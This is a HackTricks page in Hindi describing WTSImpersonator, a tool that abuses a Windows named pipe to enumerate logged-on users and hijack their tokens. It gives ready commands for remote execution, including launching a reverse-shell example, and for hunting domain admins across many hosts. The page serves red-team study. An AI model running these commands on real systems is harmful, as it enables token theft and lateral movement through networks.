<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

दूसरे तरीके HackTricks का समर्थन करने के लिए:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

**WTS Impersonator** टूल **"\\pipe\LSM_API_service"** RPC नेम्ड पाइप का शोषण करता है ताकि लॉग-इन उपयोगकर्ताओं को गुप्त रूप से गणना कर सके और उनके टोकन को हाइजैक कर सके, पारंपरिक टोकन अनुकरण तकनीकों को छलकर बाहर करते हुए। यह तकनीक नेटवर्क के भीतर अद्भुत लैटरल चलनों को सुविधाजनक बनाती है। इस तकनीक के पीछे इस तकनीक के आविष्कारक **Omri Baso** को स्वर्णित किया जाता है, जिनका काम [GitHub](https://github.com/OmriBaso/WTSImpersonator) पर उपलब्ध है।

### मूल कार्यक्षमता
यह टूल एपीआई कॉल के एक क्रम के माध्यम से काम करता है:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### कुंजी मॉड्यूल और उपयोग
- **उपयोक्ताओं की जांच करना**: उपकरण के साथ स्थानीय और दूरस्थ उपयोक्ता जांच संभव है, किसी भी स्थिति के लिए आदेश का उपयोग करके:
- स्थानीय रूप से:
```powershell
.\WTSImpersonator.exe -m enum
```
- दूरस्थ, IP पता या होस्टनाम को निर्दिष्ट करके:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **आदेशों को निष्पादित करना**: `exec` और `exec-remote` मॉड्यूल को कार्य करने के लिए एक **सेवा** संदर्भ की आवश्यकता होती है। स्थानीय निष्पादन केवल WTSImpersonator एक्जीक्यूटेबल और एक आदेश की आवश्यकता होती है:
- स्थानीय आदेश निष्पादन के लिए उदाहरण:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- सेवा संदर्भ प्राप्त करने के लिए PsExec64.exe का उपयोग किया जा सकता है:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **दूरस्थ आदेश निष्पादन**: PsExec.exe के समान दूरस्थ रूप से एक सेवा बनाना और स्थापित करना, जिससे उचित अनुमतियों के साथ निष्पादन संभव हो।
- दूरस्थ निष्पादन का उदाहरण:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **उपयोक्ता हंटिंग मॉड्यूल**: कई मशीनों पर विशिष्ट उपयोक्ताओं को लक्ष्य बनाना, उनके परमिशन के तहत कोड निष्पादित करना। यह विशेष रूप से उसके लिए उपयोक्ता डोमेन व्यवस्थापकों को लक्ष्य बनाने के लिए उपयुक्त है जिनके पास कई सिस्टमों पर स्थानीय व्यवस्थापक अधिकार हैं।
- उपयोग का उदाहरण:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
